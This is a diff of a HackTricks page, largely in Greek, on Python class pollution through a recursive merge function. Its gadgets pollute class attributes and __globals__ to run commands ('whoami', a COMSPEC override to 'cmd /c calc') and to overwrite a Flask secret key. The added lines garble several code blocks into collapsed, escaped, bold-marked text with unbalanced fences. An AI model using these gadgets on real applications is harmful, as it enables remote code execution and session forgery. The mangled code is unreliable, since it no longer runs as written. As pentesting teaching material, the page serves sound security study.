@@ -1,4 +1,4 @@
-# Ρύπανση Κλάσης (Ρύπανση Προτύπου της Python)
+# Class Pollution (Python's Prototype Pollution)
 
 <details>
 
@@ -9,7 +9,7 @@
 * Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
@@ -17,6 +17,7 @@
 ## Βασικό Παράδειγμα
 
 Ελέγξτε πώς είναι δυνατόν να ρυπάνετε τις κλάσεις αντικειμένων με αλφαριθμητικά:
+
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -40,6 +41,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
+
 ## Βασικό παράδειγμα ευπάθειας
 
 Consider the following Python code:
@@ -107,6 +109,7 @@ class Admin(User):
 ```
 
 By adding this input validation, we ensure that only User objects can be promoted or deleted by the Admin class, reducing the risk of unauthorized access or unintended consequences.
+
 ```python
 # Initial state
 class Employee: pass
@@ -139,57 +142,36 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
+
 ## Παραδείγματα Gadget
 
 <details>
 
 <summary>Δημιουργία προεπιλεγμένης τιμής ιδιότητας κλάσης για RCE (subprocess)</summary>
-```python
-from os import popen
-class Employee: pass # Creating an empty class
-class HR(Employee): pass # Class inherits from Employee class
-class Recruiter(HR): pass # Class inherits from HR class
 
-class SystemAdmin(Employee): # Class inherits from Employee class
-def execute_command(self):
-command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
-return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
+\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class
+
+class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
 
 def merge(src, dst):
-# Recursive merge function
-for k, v in src.items():
-if hasattr(dst, '__getitem__'):
-if dst.get(k) and type(v) == dict:
-merge(v, dst.get(k))
-else:
-dst[k] = v
-elif hasattr(dst, k) and type(v) == dict:
-merge(v, getattr(dst, k))
-else:
-setattr(dst, k, v)
 
-USER_INPUT = {
-"__class__":{
-"__base__":{
-"__base__":{
-"custom_command": "whoami"
-}
-}
-}
-}
+## Recursive merge function
 
-recruiter_emp = Recruiter()
-system_admin_emp = SystemAdmin()
+for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)
 
-print(system_admin_emp.execute_command())
-#> [!] Executing: "echo Hello there", output: "Hello there"
+USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }
 
-# Create default value for Employee.custom_command
-merge(USER_INPUT, recruiter_emp)
+recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()
 
-print(system_admin_emp.execute_command())
-#> [!] Executing: "whoami", output: "abdulrah33m"
-```
+print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"
+
+## Create default value for Employee.custom\_command
+
+merge(USER\_INPUT, recruiter\_emp)
+
+print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"
+
+````
 </details>
 
 <details>
@@ -221,39 +203,33 @@ merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Pollut
 
 print(not_accessible_variable) #> Polluted variable
 print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
-```
+````
+
 </details>
 
 <details>
 
 <summary>Αυθαίρετη εκτέλεση υποδιεργασιών</summary>
-```python
-import subprocess, json
 
-class Employee:
-def __init__(self):
-pass
+\`\`\`python import subprocess, json
+
+class Employee: def **init**(self): pass
 
 def merge(src, dst):
-# Recursive merge function
-for k, v in src.items():
-if hasattr(dst, '__getitem__'):
-if dst.get(k) and type(v) == dict:
-merge(v, dst.get(k))
-else:
-dst[k] = v
-elif hasattr(dst, k) and type(v) == dict:
-merge(v, getattr(dst, k))
-else:
-setattr(dst, k, v)
 
-# Overwrite env var "COMSPEC" to execute a calc
-USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value
+## Recursive merge function
 
-merge(USER_INPUT, Employee())
+for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)
+
+## Overwrite env var "COMSPEC" to execute a calc
+
+USER\_INPUT = json.loads('{"**init**":{"**globals**":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"\}}\}}\}}') # attacker-controlled value
+
+merge(USER\_INPUT, Employee())
 
 subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
-```
+
+````
 </details>
 
 <details>
@@ -296,19 +272,22 @@ merge(emp_info, Employee())
 print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
 execute() #> Executing echo Polluted
 #> Polluted
-```
+````
+
 </details>
 
 <details>
 
 <summary>Αντικατάσταση του μυστικού του Flask σε διάφορα αρχεία</summary>
 
-Έτσι, αν μπορείτε να κάνετε μια κλασική ρύπανση πάνω σε ένα αντικείμενο που έχει οριστεί στο κύριο αρχείο Python της ιστοσελίδας, **της οποίας η κλάση έχει οριστεί σε διαφορετικό αρχείο** από το κύριο. Επειδή για να έχετε πρόσβαση στο \_\_globals\_\_ στις προηγούμενες επιθέσεις, πρέπει να έχετε πρόσβαση στην κλάση του αντικειμένου ή στις μεθόδους της κλάσης, θα μπορείτε να **έχετε πρόσβαση στα globals σε αυτό το αρχείο, αλλά όχι στο κύριο**. \
+Έτσι, αν μπορείτε να κάνετε μια κλασική ρύπανση πάνω σε ένα αντικείμενο που έχει οριστεί στο κύριο αρχείο Python της ιστοσελίδας, **της οποίας η κλάση έχει οριστεί σε διαφορετικό αρχείο** από το κύριο. Επειδή για να έχετε πρόσβαση στο \_\_globals\_\_ στις προηγούμενες επιθέσεις, πρέπει να έχετε πρόσβαση στην κλάση του αντικειμένου ή στις μεθόδους της κλάσης, θα μπορείτε να **έχετε πρόσβαση στα globals σε αυτό το αρχείο, αλλά όχι στο κύριο**.\
 Συνεπώς, **δεν θα μπορείτε να έχετε πρόσβαση στο αντικείμενο Flask app global** που ορίζει το **κλειδί του μυστικού** στην κύρια σελίδα:
+
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
+
 Σε αυτό το σενάριο χρειάζεστε ένα εργαλείο για να περιηγηθείτε στα αρχεία για να φτάσετε στο κύριο αρχείο και να **αποκτήσετε πρόσβαση στον παγκόσμιο αντικείμενο `app.secret_key`** για να αλλάξετε το μυστικό κλειδί του Flask και να είστε σε θέση να [**αναβαθμίσετε τα δικαιώματα** γνωρίζοντας αυτό το κλειδί](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
 Ένα πακέτο όπως αυτό [από αυτήν την ανάλυση](https://ctftime.org/writeup/36082):
@@ -342,7 +321,7 @@ __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.se
 * Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
